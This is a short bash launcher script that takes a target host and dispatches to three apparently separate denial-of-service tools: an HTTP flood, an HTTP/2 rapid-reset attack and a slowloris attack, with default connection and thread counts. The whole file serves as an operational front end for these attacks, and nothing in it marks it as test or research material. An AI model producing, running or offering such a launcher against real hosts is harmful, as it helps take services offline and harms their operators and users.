#!/usr/bin/env bash
set -e
cd "$(dirname "$0")"
case "$1" in
  http)        python3 src/flood_http.py -u "$2" -c "${3:-500}" ;;
  reset)       python3 src/rapid_reset.py -H "$2" -p "${3:-443}" -T "${4:-200}" ;;
  slow)        python3 src/slowloris.py -H "$2" -p "${3:-80}" -n "${4:-500}" ;;
  *) echo "usage: $0 {http|reset|slow} <target> [params...]"; exit 1 ;;
esac